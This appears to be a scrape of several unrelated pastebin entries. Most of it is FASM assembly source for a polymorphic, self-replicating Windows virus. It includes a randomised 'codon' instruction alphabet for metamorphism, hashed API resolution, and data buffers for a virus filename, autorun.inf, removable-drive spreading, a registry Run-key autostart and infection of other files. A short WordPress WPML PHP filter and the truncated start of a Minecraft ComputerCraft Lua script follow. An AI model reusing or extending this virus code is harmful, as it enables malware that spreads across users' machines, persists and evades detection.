    appendToList @nopsA.list, codon
}
macro _nopsA { getRandomItem @nopsA.list }

; - - -

CreateEmptyList @nopsB.list
macro @nopsB codon*
{
    CreatePaddedInstruction mov, ebx, ebp
    appendToList @nopsB.list, codon
}
macro _nopsB { getRandomItem @nopsB.list }

; - - -

CreateEmptyList @nopsD.list
macro @nopsD codon*
{
    CreatePaddedInstruction mov, ebx, edx
    appendToList @nopsD.list, codon
}
macro _nopsD { getRandomItem @nopsD.list }

; - - -

CreateEmptyList @nopdA.list
macro @nopdA codon*
{
    CreatePaddedInstruction mov, eax, ebx
    appendToList @nopdA.list, codon
}
macro _nopdA { getRandomItem @nopdA.list }

; - - -

CreateEmptyList @nopdB.list
macro @nopdB codon*
{
    CreatePaddedInstruction mov, ebp, ebx
    appendToList @nopdB.list, codon
}
macro _nopdB { getRandomItem @nopdB.list }

; - - -

CreateEmptyList @nopdD.list
macro @nopdD codon*
{
    CreatePaddedInstruction mov, edx, ebx
    appendToList @nopdD.list, codon
}
macro _nopdD { getRandomItem @nopdD.list }

; - - -

CreateEmptyList @saveWrtOff.list
macro @saveWrtOff codon*
{
    CreatePaddedInstruction mov, edi, ebx
    appendToList @saveWrtOff.list, codon
}
macro _saveWrtOff { getRandomItem @saveWrtOff.list }

; - - -

CreateEmptyList @saveJmpOff.list
macro @saveJmpOff codon*
{
    CreatePaddedInstruction mov, esi, ebx
    appendToList @saveJmpOff.list, codon
}
macro _saveJmpOff { getRandomItem @saveJmpOff.list }

; - - -

CreateEmptyList @writeByte.list
macro @writeByte codon*
{
    CreatePaddedInstruction mov, byte[edi], bl
    appendToList @writeByte.list, codon
}
macro _writeByte { getRandomItem @writeByte.list }

; - - -

CreateEmptyList @writeDWord.list
macro @writeDWord codon*
{
    CreatePaddedInstruction mov, dword[edi], ebx
    appendToList @writeDWord.list, codon
}
macro _writeDWord { getRandomItem @writeDWord.list }

; - - -

CreateEmptyList @save.list
macro @save codon*
{
    CreatePaddedInstruction mov, ecx, ebx
    appendToList @save.list, codon
}
macro _save { getRandomItem @save.list }

; - - -

CreateEmptyList @addsaved.list
macro @addsaved codon*
{
    CreatePaddedInstruction add, ebx, ecx
    appendToList @addsaved.list, codon
}
macro _addsaved { getRandomItem @addsaved.list }

; - - -

CreateEmptyList @getDO.list
macro @getDO codon*
{
    CreatePaddedInstruction mov, ebx, DataOffset
    appendToList @getDO.list, codon
}
macro _getDO { getRandomItem @getDO.list }

; - - -

CreateEmptyList @getdata.list
macro @getdata codon*
{
    CreatePaddedInstruction mov, ebx, dword[ebx]
    appendToList @getdata.list, codon
}
macro _getdata { getRandomItem @getdata.list }

; - - -

CreateEmptyList @getEIP.list
macro @getEIP codon*
{
    InstrSize=6
    db 0xE8,0x00,0x00,0x00,0x00,0x5B
    times (8-InstrSize): nop	      ; padding
    appendToList @getEIP.list, codon
}
macro _getEIP { getRandomItem @getEIP.list }

; - - -

CreateEmptyList @push.list
macro @push codon*
{
    CreatePaddedInstruction push, ebx
    appendToList @push.list, codon
}
macro _push { getRandomItem @push.list }

; - - -

CreateEmptyList @pop.list
macro @pop codon*
{
    CreatePaddedInstruction pop, ebx
    appendToList @pop.list, codon
}
macro _pop { getRandomItem @pop.list }

; - - -

CreateEmptyList @pushall.list
macro @pushall codon*
{
    CreatePaddedInstruction pushad
    appendToList @pushall.list, codon
}
macro _pushall { getRandomItem @pushall.list }

; - - -

CreateEmptyList @popall.list
macro @popall codon*
{
    CreatePaddedInstruction popad
    appendToList @popall.list, codon
}
macro _popall { getRandomItem @popall.list }

; - - -


CreateEmptyList @mul.list
macro @mul codon*
{
    CreatePaddedInstruction mul, ebx
    appendToList @mul.list, codon
}
macro _mul {getRandomItem @mul.list}

; - - -

CreateEmptyList @div.list
macro @div codon*
{
    CreatePaddedInstruction div, ebx
    appendToList @div.list, codon
}
macro _div { getRandomItem @div.list }

; - - -

CreateEmptyList @shl.list
macro @shl codon*
{
    CreatePaddedInstruction shl, ebx, cl
    appendToList @shl.list, codon
}
macro _shl { getRandomItem @shl.list }

; - - -

CreateEmptyList @shr.list
macro @shr codon*
{
    CreatePaddedInstruction shr, ebx, cl
    appendToList @shr.list, codon
}
macro _shr { getRandomItem @shr.list }

; - - -

CreateEmptyList @and.list
macro @and codon*
{
    CreatePaddedInstruction and, ebx, ecx
    appendToList @and.list, codon
}
macro _and { getRandomItem @and.list }

; - - -

CreateEmptyList @xor.list
macro @xor codon*
{
    CreatePaddedInstruction xor, ebx, ecx
    appendToList @xor.list, codon
}
macro _xor { getRandomItem @xor.list }

; - - -

CreateEmptyList @add0001.list
macro @add0001 codon*
{
    CreatePaddedInstruction add, ebx, 0x0001
    appendToList @add0001.list, codon
}
macro _add0001 { getRandomItem @add0001.list }


; - - -

CreateEmptyList @sub0001.list
macro @sub0001 codon*
{
    CreatePaddedInstruction sub, ebx, 1
    appendToList @sub0001.list, codon
}
macro _sub0001 { getRandomItem @sub0001.list }

; - - -

CreateEmptyList @JnzUp.list
macro @JnzUp codon*
{
    InstrSize = 4
    db 0x74,0x02,0xFF,0xE6
    times (8-InstrSize): nop

    appendToList @JnzUp.list, codon
}
macro _JnzUp { getRandomItem @JnzUp.list }

; - - -

CreateEmptyList @JnzDown.list
macro @JnzDown codon*
{
    local StartCommand, EndCommand
    InstrSize=2
    db 0x75, 0x26
    times (8-InstrSize): nop

    appendToList @JnzDown.list, codon
}
macro _JnzDown { getRandomItem @JnzDown.list }

; - - -

CreateEmptyList @call.list
macro @call codon*
{
    CreatePaddedInstruction stdcall, ebx
    appendToList @call.list, codon
}
macro _call { getRandomItem @call.list }

; - - -

CreateEmptyList @CallAPILoadLibrary.list
macro @CallAPILoadLibrary codon*
{
    CreatePaddedInstruction stdcall, [LoadLibrary]
    appendToList @CallAPILoadLibrary.list, codon
}
macro _CallAPILoadLibrary { getRandomItem @CallAPILoadLibrary.list }

; - - -

CreateEmptyList @CallAPIMessageBox.list
macro @CallAPIMessageBox codon*
{
    CreatePaddedInstruction stdcall, [MessageBox]
    appendToList @CallAPIMessageBox.list, codon
}
macro _CallAPIMessageBox { getRandomItem @CallAPIMessageBox.list }

; - - -

CreateEmptyList @CallAPIExitProcess.list
macro @CallAPIExitProcess codon*
{
    CreatePaddedInstruction stdcall, [ExitProcess]
    appendToList @CallAPIExitProcess.list, codon
}

macro _CallAPIExitProcess { getRandomItem @CallAPIExitProcess.list }

; - - -

CreateEmptyList @int3.list
macro @int3 codon*
{
    ;CreatePaddedInstruction int3
    int 3
    times 6: nop
    appendToList @int3.list, codon
}
macro _int3 { getRandomItem @int3.list }

; - - -


macro CountListEntries [AminoAcid]
{
    display `AminoAcid,': '
    getListSize AminoAcid#.list
    displayDecNum getListSizeRV
}


macro CheckIfAllAminoAcidsAreCreated [AminoAcid]
{
    getListSize AminoAcid#.list
    if getListSizeRV=0
	display ""At least one Amino Acid"",13,10,""has no codon for mapping."",13,10,""Try to compile again!""
	err
    end if
}



macro CreateRandomAlphabet
{
    repeat 256
	cc = % - 1				     ; Starts at 1, but should start at 0
	if (cc AND 0x91)=0x91
	    @nopREAL cc   ; Splicing
	    display '@nopREAL: '
	    displayDecNum cc
	else if cc=StartCodon
	    CreatePaddedInstruction xchg, ebx, ebx   ; some No-Operation, such that its different to nopREAL and will not be target of polymorphism
	    display 'StartCodon: '
	    displayDecNum cc
	else if cc=StopCodon
	    CreatePaddedInstruction xchg, ecx, ecx   ; some No-Operation, such that its different to nopREAL and will not be target of polymorphism
	    display 'StopCodon: '
	    displayDecNum cc
	else
	    GetNewRandomNumber
	    RR = (RndNum MOD (InstructionSetSize*2)) ; (InstructionSetSize*2) because the LCG doesnt create perfect random numbers
						     ; It does not create 2^n as often as primes or (2^n +/- 1), so by taking two numbers,
						     ; a 2^n will be paired with (2^n +/- 1), thus the probability that a amino acid will
						     ; not be taken at all decreases alot. (=rare err-message at CheckIfAllAminoAcidsAreCreated)
	    if RR<2
		@nopREAL cc
		display '@nopREAL: '
		displayDecNum cc
	    else if RR<4
		@nopsA cc
		display '@nopsA: '
		displayDecNum cc
	    else if RR<6
		@nopsB cc
		display '@nopsB: '
		displayDecNum cc
	    else if RR<8
		@nopsD cc
		display '@nopsD: '
		displayDecNum cc
	    else if RR<10
		@nopdA cc
		display '@nopdA: '
		displayDecNum cc
	    else if RR<12
		@nopdB cc
		display '@nopdB: '
		displayDecNum cc
	    else if RR<14
		@nopdD cc
		display '@nopdD: '
		displayDecNum cc
	    else if RR<16
		@saveWrtOff cc
		display '@saveWrtOff: '
		displayDecNum cc
	    else if RR<18
		@saveJmpOff cc
		display '@saveJmpOff: '
		displayDecNum cc
	    else if RR<20
		@writeByte cc
		display '@writeByte: '
		displayDecNum cc
	    else if RR<22
		@writeDWord cc
		display '@writeDWord: '
		displayDecNum cc
	    else if RR<24
		@save cc
		display '@save: '
		displayDecNum cc
	    else if RR<26
		@addsaved cc
		display '@addsaved: '
		displayDecNum cc
	    else if RR<28
		@getDO cc
		display '@getDO: '
		displayDecNum cc
	    else if RR<30
		@getdata cc
		display '@getdata: '
		displayDecNum cc
	    else if RR<32
		@getEIP cc
		display '@getEIP: '
		displayDecNum cc
	    else if RR<34
		@push cc
		display '@push: '
		displayDecNum cc
	    else if RR<36
		@pop cc
		display '@pop: '
		displayDecNum cc
	    else if RR<38
		@pushall cc
		display '@pushall: '
		displayDecNum cc
	    else if RR<40
		@popall cc
		display '@popall: '
		displayDecNum cc
	    else if RR<42
		@mul cc
		display '@mul: '
		displayDecNum cc
	    else if RR<44
		@div cc
		display '@div: '
		displayDecNum cc
	    else if RR<46
		@shl cc
		display '@shl: '
		displayDecNum cc
	    else if RR<48
		@shr cc
		display '@shr: '
		displayDecNum cc
	    else if RR<50
		@and cc
		display '@and: '
		displayDecNum cc
	    else if RR<52
		@xor cc
		display '@xor: '
		displayDecNum cc
	    else if RR<54
		@add0001 cc
		display '@add0001: '
		displayDecNum cc
	    else if RR<56
		@sub0001 cc
		display '@sub0001: '
		displayDecNum cc
	    else if RR<58
		@JnzUp cc
		display '@JnzUp: '
		displayDecNum cc
	    else if RR<60
		@JnzDown cc
		display '@JnzDown: '
		displayDecNum cc
	    else if RR<62
		@call cc
		display '@call: '
		displayDecNum cc
	    else if RR<64
		@CallAPILoadLibrary cc
		display '@CallAPILoadLibrary: '
		displayDecNum cc
	    else
		@int3 cc
		display '@shl: '
		displayDecNum cc
	    end if
	end if
    end repeat
    display 13,10,'---',13,10
    CountListEntries AminoAcidList
    CheckIfAllAminoAcidsAreCreated AminoAcidList
}





macro CreateBalancedAlphabet
{
	     @nopdD 0

	     @nopdD 1

	     @nopdD 2

	     @nopdD 3

	     @addsaved 4

	     @and 5

	     @addsaved 6

	     @and 7

	     @popall 8

	     @pushall 9

	     @getdata 10

	     @pushall 11

	     @call 12

	     @add0001 13

	     @getdata 14

	     @nopdA 15

	     @push 16

	     @writeDWord 17

	     @push 18

	     @writeDWord 19

	     @push 20

	     @and 21

	     @push 22

	     @and 23

	     @getdata 24

	     @add0001 25

	     @getdata 26

	     @sub0001 27

	     @getdata 28

	     @add0001 29

	     @getdata 30

	     @and 31

	     @mul 32

	     @nopdD 33

	     @mul 34

	     @nopdD 35

	     @addsaved 36

	     @getEIP 37

	     @addsaved 38

	     @getEIP 39

	     @pop 40

	     @nopsA 41

	     @pop 42

	     @nopsA 43

	     @pop 44

	     @add0001 45

	     @JnzUp 46

	     @nopdA 47

	     @push 48

	     @writeDWord 49

	     @push 50

	     @writeDWord 51

	     @push 52

	     @saveJmpOff 53

	     @push 54

	     @saveJmpOff 55

	     @pop 56

	     @add0001 57

	     @pop 58

	     @sub0001 59

	     @pop 60

	     @add0001 61

	     @pop 62

	     @nopdA 63

	     @popall 64

	     @writeDWord 65

	     @CallAPILoadLibrary 66

	     @writeDWord 67

	     @popall 68

	     @and 69

	     @addsaved 70

	     @and 71

	     @popall 72

	     @pushall 73

	     @getdata 74

	     @pushall 75

	     @popall 76

	     @add0001 77

	     @getdata 78

	     @nopdA 79

	     @popall 80

	     @writeDWord 81

	     @push 82

	     @writeDWord 83

	     @popall 84

	     @and 85

	     @save 86

	     @and 87

	     @popall 88

	     @add0001 89

	     @getdata 90

	     @sub0001 91

	     @popall 92

	     @add0001 93

	     @getdata 94

	     @and 95

	     @saveWrtOff 96

	     @writeDWord 97

	     @saveWrtOff 98

	     @writeDWord 99

	     @saveWrtOff 100

	     @getEIP 101

	     @saveWrtOff 102

	     @nopdA 103

	     @saveWrtOff 104

	     @nopsA 105

	     @saveWrtOff 106

	     @nopsA 107

	     @saveWrtOff 108

	     @add0001 109

	     @saveWrtOff 110

	     @nopdA 111

	     @saveWrtOff 112

	     @writeDWord 113

	     @push 114

	     @writeDWord 115

	     @saveWrtOff 116

	     @saveJmpOff 117

	     @writeByte 118

	     @nopdA 119

	     @saveWrtOff 120

	     @add0001 121

	     @JnzDown 122

	     @sub0001 123

	     @saveWrtOff 124

	     @add0001 125

	     @writeByte 126

	     @nopdA 127

	     @getDO 128

	     @getDO 129

	     @getDO 130

	     @getDO 131

	     @addsaved 132

	     @shl 133

	     @addsaved 134

	     @shl 135

	     @shr 136

	     @nopREAL 137

	     @nopsB 138

	     @nopsA 139

	     @shr 140

	     @add0001 141

	     @nopdB 142

	     @nopdB 143

	     ; 144 = 0x90 = real NOP! :)
	     @nopREAL 144

	     ; SPLICING! must be NOP!!!
	     @nopREAL 145

	     @nopsB 146

	     ; SPLICING! must be NOP!!!
	     @nopREAL 147

	     @save 148

	     ; SPLICING! must be NOP!!!
	     @nopREAL 149

	     @save 150

	     ; SPLICING! must be NOP!!!
	     @nopREAL 151


_START EQU 152
ACommand152:
		     ; THIS IS THE START CODON!!!
		     ; THE bit-sequence is different to other no-operations,
		     ; such that it wont be targeted from the poly-engine
		 xchg ebx, ebx
ECommand152:
times (8-ECommand152+ACommand152): nop


	     ; SPLICING! must be NOP!!!
	     @nopREAL 153

	     @nopsB 154

	     ; SPLICING! must be NOP!!!
	     @nopREAL 155

	     @save 156

	     ; SPLICING! must be NOP!!!
	     @nopREAL 157

	     @save 158

	     ; SPLICING! must be NOP!!!
	     @nopREAL 159

	     @getDO 160

	     @getDO 161

	     @getDO 162

	     @getDO 163

	     @shl 164

	     @shl 165

	     @shl 166

	     @shl 167

	     @xor 168

	     @nopREAL 169

	     @nopsD 170

	     @nopsA 171

	     @shl 172

	     @add0001 173

	     @nopsD 174

	     @nopdB 175


_STOP EQU 176
ACommand176:
		     ; THIS IS THE STOP CODON!!!
		     ; THE bit-sequence is different to other no-operations,
		     ; such that it wont be targeted from the poly-engine
		 xchg ecx, ecx
ECommand176:
times (8-ECommand176+ACommand176): nop


	     ; SPLICING! must be NOP!!!
	     @nopREAL 177

	     @div 178

	     ; SPLICING! must be NOP!!!
	     @nopREAL 179

	     @save 180

	     ; SPLICING! must be NOP!!!
	     @nopREAL 181

	     @save 182

	     ; SPLICING! must be NOP!!!
	     @nopREAL 183

	     @xor 184

	     ; SPLICING! must be NOP!!!
	     @nopREAL 185

	     @nopsD 186

	     ; SPLICING! must be NOP!!!
	     @nopREAL 187

	     @save 188

	     ; SPLICING! must be NOP!!!
	     @nopREAL 189

	     @save 190

	     ; SPLICING! must be NOP!!!
	     @nopREAL 191

	     @getDO 192

	     @add0001 193

	     @getDO 194

	     @getDO 195

	     @addsaved 196

	     @shl 197

	     @addsaved 198

	     @shl 199

	     @shr 200

	     @nopREAL 201

	     @nopsB 202

	     @nopsA 203

	     @addsaved 204

	     @add0001 205

	     @nopdB 206

	     @nopdB 207

	     @sub0001 208

	     ; SPLICING! must be NOP!!!
	     @nopREAL 209

	     @nopsB 210

	     ; SPLICING! must be NOP!!!
	     @nopREAL 211

	     @save 212

	     ; SPLICING! must be NOP!!!
	     @nopREAL 213

	     @save 214

	     ; SPLICING! must be NOP!!!
	     @nopREAL 215

	     @sub0001 216

	     ; SPLICING! must be NOP!!!
	     @nopREAL 217

	     @nopsB 218

	     ; SPLICING! must be NOP!!!
	     @nopREAL 219

	     @save 220

	     ; SPLICING! must be NOP!!!
	     @nopREAL 221

	     @save 222

	     ; SPLICING! must be NOP!!!
	     @nopREAL 223

	     @getDO 224

	     @getDO 225

	     @getDO 226

	     @getDO 227

	     @shl 228

	     @shl 229

	     @shl 230

	     @shl 231

	     @xor 232

	     @nopREAL 233

	     @nopsD 234

	     @nopsA 235

	     @shl 236

	     @add0001 237

	     @nopsD 238

	     @nopdB 239

	     @xor 240

	     ; SPLICING! must be NOP!!!
	     @nopREAL 241

	     @div 242

	     ; SPLICING! must be NOP!!!
	     @nopREAL 243

	     @save 244

	     ; SPLICING! must be NOP!!!
	     @nopREAL 245

	     @save 246

	     ; SPLICING! must be NOP!!!
	     @nopREAL 247

	     @xor 248

	     ; SPLICING! must be NOP!!!
	     @nopREAL 249

	     @nopsD 250

	     ; SPLICING! must be NOP!!!
	     @nopREAL 251

	     @save 252

	     ; SPLICING! must be NOP!!!
	     @nopREAL 253

	     @save 254

	     ; SPLICING! must be NOP!!!
	     @nopREAL 255



;1380: Energy!: 1055.83


}


macro CreateAlphabet
{
    CreateBalancedAlphabet
;    CreateRandomAlphabet
}"
1ZKrahgd,data_n_equs.inc,FlyFar,MPASM,Thursday 27th of July 2023 01:54:46 AM CDT,"; ############################################################################
; ############################################################################
; #####
; ##### CONSTANT DEFINITION
; #####

  StartCodon EQU 0x98
  StopCodon  EQU 0xB0

  CodeStart EQU 0x600

  ; One out of n bytes will be changed: 7 > n > (2^32 - 1)

					      ; THIS SHOULD BE A PRIME
					      ; FOR GOOD RANDOMNESS!
  IntronInsertThreshold EQU 5

  VarThreshold1 	EQU 15013
  xchgThreshold1	EQU 100003
  InsertThreshold1	EQU 5
  HGTThreshold1 	EQU 5

; #####
; ##### CONSTANT DEFINITION
; #####
; ############################################################################
; ############################################################################




; ############################################################################
; ############################################################################
; #####
; #####   DATA
; #####

DataOffset:
	PseudoRegC	dd 0x0		 ; Pseudo-Register, interact with nopsC and nopdC
					 ; Just for internal useage, dont use that in code!
					 ; If the relative position to DataOffset will change,
					 ; also change it in instruction_set_macro.inc in _nopdC and _nopsC-macro
					 ; (some additionals _add0001s, NOT addnumber-macro useage!)

	Place4Life	dd 0x0
	RandomNumber	dd 0x0


			db 0x0
	   Driveletter1 db 0x0
			db 0x0, 0x0	 ; buffer for "":\""

	RandomFileName: times 8 db 0x0	 ; buffer for random filename
	   rndext:	times 4 db 0x0	 ; .exe
			db 0x0

			db 0x0
	   Driveletter2 db 0x0
			db 0x0, 0x0	; buffer for "":\""

	   autoruninf:	times 11 db 0x0
			db 0x0


			db 0x0
	   Driveletter3 db 0x0, 0x0, 0x0     ; buffer for ""C:\""

	   virusname:	times 8 db 0x0	     ; virus filename at C:
	   virext:	times 4 db 0x0	     ; .exe
			db 0x0

	RandomFileName2: times 8 db 0x0   ; buffer for random filename
	   rndext2:	 times 4 db 0x0   ; .exe
			db 0x0

	FileHandle	dd 0x0
	MapHandle	dd 0x0
	MapPointer	dd 0x0
	FileSize	dd 0x0

	stDLLkernel32: times 12 db 0x0
		      db 0x0
	stDLLadvapi32: times 12 db 0x0
		      db 0x0

	hDLLlibrary32  dd 0x0

	hAddressTable dd 0x0
	hNamePointerTable dd 0x0
	hOrdinalTable dd 0x0

	APINumber dd 0x0

   APINumberKernel EQU (APIMagicNumbersKernelEnd-APIMagicNumbersKernel)/4
   APINumberAdvapi EQU (APIMagicNumbersRegEnd-APIMagicNumbersReg)/4

	APITmpBuffer dd 0x0
	hMagicNumberPointer dd 0x0

   APIMagicNumbersKernel:
	mCloseHandle dd 0x0 ; 0x0342
	mCopyFileA   dd 0x0 ; 0x0C5C
	mCreateFileA dd 0x0 ; 0x0615
	mCreateFileMappingA dd 0x0 ; 0x04E1
	mCreateProcessA   dd 0x0 ; 0x0674
	mGetDriveTypeA	  dd 0x0 ; 0x0AFD
	mGetCommandLineA  dd 0x0 ; 0x06A8
	mGetFileSize	  dd 0x0 ; 0x083B
	mWriteFile	  dd 0x0 ; 0x078B
	mGetTickCount	  dd 0x0 ; 0x01B4
	mMapViewOfFile	  dd 0x0 ; 0x05EE
	mSleep		  dd 0x0 ; 0x07F9
	mFindFirstFileA   dd 0x0 ; 0x094A
	mFindNextFileA	  dd 0x0 ; 0x0FE1
	mUnmapViewOfFile  dd 0x0 ; 0x01D1
	mSetErrorMode	  dd 0x0 ; 0x0CBB
   APIMagicNumbersKernelEnd:

   APIMagicNumbersReg:
	mRegCreateKeyA	  dd 0x0 ; 0x0EDC
	mRegSetValueExA   dd 0x0 ; 0x0845
;        mRegCloseKey      dd 0x0F3D
   APIMagicNumbersRegEnd:


	hAddressePointer dd 0x0
   APIAddresses:
	hCloseHandle dd 0x0
	hCopyFileA   dd 0x0
	hCreateFileA dd 0x0
	hCreateFileMappingA dd 0x0
	hCreateProcessA   dd 0x0
	hGetDriveTypeA	  dd 0x0
	hGetCommandLineA  dd 0x0
	hGetFileSize	  dd 0x0
	hWriteFile	  dd 0x0
	hGetTickCount	  dd 0x0
	hMapViewOfFile	  dd 0x0
	hSleep		  dd 0x0
	hFindFirstFileA   dd 0x0
	hFindNextFileA	  dd 0x0
	hUnmapViewOfFile  dd 0x0
	hSetErrorMode	  dd 0x0

   APIAddressesReg:
	hRegCreateKeyA	  dd 0x0
	hRegSetValueExA   dd 0x0
;        hRegCloseKey      dd 0x0



	xchgBuffer dd 0x0

	InsStart dd 0x0
	InsEnd	 dd 0x0
	nBlockSize	dd 0x0
	nByteBlockToMov dd 0x0

	stSubKey: times 46 db 0x0 ; SOFTWARE\Microsoft\Windows\CurrentVersion\Run
				  ; will be created at runtime

	hRegKey dd 0x0

	AutoStartContentStart: times 51 db 0x0
	AutoStartContentEnd:




StartUp_struct:
  StartUp_struct_cb		 dd 0
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0


ProcessInfo_struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0




; *********************************
; *** Horizontal_gene_transfer_data

WIN32_FIND_DATA_struct:
  WIN32_FIND_DATA_dwFileAttributes   dd 0
  WIN32_FIND_DATA_ftCreationTime     FILETIME
  WIN32_FIND_DATA_ftLastAccessTime   FILETIME
  WIN32_FIND_DATA_ftLastWriteTime    FILETIME
  WIN32_FIND_DATA_nFileSizeHigh      dd 0
  WIN32_FIND_DATA_nFileSizeLow	     dd 0
  WIN32_FIND_DATA_dwReserved0	     dd 0
  WIN32_FIND_DATA_dwReserved1	     dd 0
  WIN32_FIND_DATA_cFileName	     db MAX_PATH dup (0)
  WIN32_FIND_DATA_cAlternateFileName db 14 dup (0)

	HGT_searchmask	   dd 0x0

	HGT_FFHandle	   dd 0x0


	HGTFileHandle	   dd 0x0
	HGTMapHandle	   dd 0x0
	HGTMapPointer	   dd 0x0
	HGTFileSize	   dd 0x0
	HGTDidInsert	   dd 0x0

; *********************************
; *** Redundancy polymorphism

	RPAminoAcid1	dd 0x0
	RPAminoAcid2	dd 0x0

; #####
; #####   DATA
; #####
; ############################################################################
; ############################################################################"
0fRvnDZw,instruction_set_macros.inc,FlyFar,ASM (NASM),Thursday 27th of July 2023 01:53:56 AM CDT,"macro addnumber BigNum*
{
;    CreateAnIntron
    AlreadyStarted=0
    if BigNum<25
	repeat BigNum
	    _add0001
	end repeat
    else
	_pushall
	_push  ; BC1 to stack
	_save
;        CreateAnIntron
	_xor   ; BC1=0
	_add0001
	_save
	_sub0001 ; BC1=0, BC2=1
;        CreateAnIntron
	irp num, 0x8000'0000,0x4000'0000,0x2000'0000,0x1000'0000,0x800'0000,0x400'0000,0x200'0000,0x100'0000,0x80'0000,0x40'0000,0x20'0000,0x10'0000,0x8'0000,0x4'0000,0x2'0000,0x1'0000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
	\{
	    if AlreadyStarted=1
		_shl
	    end if
	    if (BigNum AND num)>0
		_add0001
		AlreadyStarted=1
	    end if
	\} ; BC1=BigNum
;        CreateAnIntron
	_save		; BC2=BigNum
	_pop		; restore BC1
	_addsaved	; BC1=BC1+BigNum
	_nopdC		; Save in RegC
	_popall 	; Restore all registers
	_nopsC		; BC1=BC1+BigNum
;        CreateAnIntron
	_pushall	; Restore ZF
	_save
	_and
	_popall
    end if
;    CreateAnIntron

}


macro GetAddress address
{
    _getDO
;    CreateAnIntron
    addnumber (address-DataOffset)
}



macro CallAPI APIName
{
;    CreateAnIntron
    _getDO
    addnumber (APIName-DataOffset)
    _getdata
    _call
;    CreateAnIntron
}



macro CalcNewRandNumberAndSaveIt
{
	GetAddress RandomNumber
;        CreateAnIntron
	_saveWrtOff
	_getdata
	_nopdA			 ; eax=[RandomNumber]

	_zer0 0
	addnumber 1103515245
;        CreateAnIntron
	_mul			 ; eax*=1103515245 % 2^32

	_zer0 0
	addnumber 12345
	_save
;        CreateAnIntron
	_nopsA
	_addsaved		 ; eax+=12345 % 2^32

	_writeDWord		 ; mov [RandomNumber], ebx
}


macro _nopdC
{
	_pushall		; save all registers
	_push			; save BC1
;        CreateAnIntron
	_getDO			; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
;        CreateAnIntron
	_saveWrtOff		; BA1=RegC
	_pop
	_writeDWord		; mov dword[RegC], BC1
	_popall 		; restore all registers
}


macro _nopsC
{
	_getDO			; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
	_getdata
;        CreateAnIntron
	display '.'
}


macro _zer0 SaveBC2*
{
; Simulate _zer0 instruction.
; The argument tells wheter BC2 should be restored or not.

    if SaveBC2<>0
	_pushall
;        CreateAnIntron
    end if

;        CreateAnIntron
	_save		; BC2=BC1
	_xor		; BC1=BC1 XOR BC2 = 0


    if SaveBC2<>0
	_nopdC
	_popall
	_nopsC
    end if
}


macro _subsaved SaveBC2*
{
; Simulate _subsaved instruction.
; The argument tells wheter BC2 should be restored or not.

    if SaveBC2<>0
	_pushall
;        CreateAnIntron
    end if

;         CreateAnIntron
	_push		; save BC1
	_zer0 1 	; BC1=0
	_sub0001	; BC1=0xFFFF'FFFF
;        CreateAnIntron
	_xor		; BC1=0xFFFF'FFFF XOR BC2
	_add0001	; BC1=-BC2
	_save		; BC2=-BC2
	_pop		; restore BC1
	_addsaved	; BC1=BC1+(-BC2)
;        CreateAnIntron

    if SaveBC2<>0
	_nopdC
	_popall
	_nopsC
;        CreateAnIntron
	_pushall	; Restore ZF
	_save
	_and
	_popall
    end if

}"
Ruyjjra0,JKIT || Fix Header/Footer Template Not Support for WPML,fauzanjeg,PHP,Thursday 27th of July 2023 01:14:19 AM CDT,"/**
 * Fix Header/Footer Template Not Support for WPML
 */
if ( class_exists( 'SitePress' ) && ! function_exists( 'jkit_wpml_custom_template_conditions' ) ) {
	/**
	 * Custom Condition for Jeg Elementor Kit Header/Footer Template
	 *
	 * @param bool  $flag The Conditions.
	 * @param int   $post_id The Post ID.
	 * @param int   $header_id The Template ID.
	 * @param array $conditions The Condition args.
	 */
	function jkit_wpml_custom_template_conditions( $flag, $post_id, $header_id, $conditions ) {
		/**
		 * Get The Current Language by `wpml_current_language` hook filters
		 */
		 $current_lang = apply_filters( 'wpml_current_language', null );

		/**
		 * List Template ID for each Languages
		 *
		 * Wrap by array, if have multivalue (many template), write like this:
		 *
		 * array( 4407, 4408 ); // array( id1, id2, id3 );
		 */
		$indonesia_template_ids = array( 4407 ); /** Indonesia Template IDs */
		$english_template_id    = array( 4405 ); /** English Template IDs */

		/**
		 * Check if Template ID in Language Templates
		 */
		if ( in_array( $header_id, $indonesia_template_ids ) ) {
			/**
			 * Check if current language is Indonesia (id)
			 */
			if ( $current_lang === 'id' ) {
				$flag = $flag && true;
			} else {
				$flag = $flag && false;
			}
		}

		/**
		 * Check if Template ID in Language Templates
		 */
		if ( in_array( $header_id, $english_template_id ) ) {
			/**
			 * Check if current language is English (en)
			 */
			if ( $current_lang === 'en' ) {
				$flag = $flag && true;
			} else {
				$flag = $flag && false;
			}
		}

		return $flag;
	}
	add_filter( 'jkit_check_template_conditions', 'jkit_wpml_custom_template_conditions', 10, 4 );
}"
ypATwaqW,w 试制护盾多激光系统,jaklsfjlsak,Lua,Thursday 27th of July 2023 12:53:08 AM CDT,"-- Load the warpdriveCommons API
if warpdriveCommons then os.unloadAPI(""warpdriveCommons"") end
if not os.loadAPI(""warpdrive/warpdriveCommons"") then error(""missing warpdriveCommons"") end
local w = warpdriveCommons.w

if fs.exists(""conf"") == false then
    shell.run(""pastebin get 38M5cNbZ conf"")
    term.clear()
end

local OffsetValue = 3 -- How much you want your shield to be configured forward
local shield = peripheral.find(""warpdriveForceFieldProjector"")
local lever = ""front"" -- format: front,back,left,right,top,bottom ONLY
local safedist = 15 -- Set Safe Distance

local lasers = {}

function setupLasers()
  local laserPeripherals = peripheral.getNames()
  for _, name in ipairs(laserPeripherals) do
    if peripheral.getType(name) == ""warpdriveLaserCamera"" then
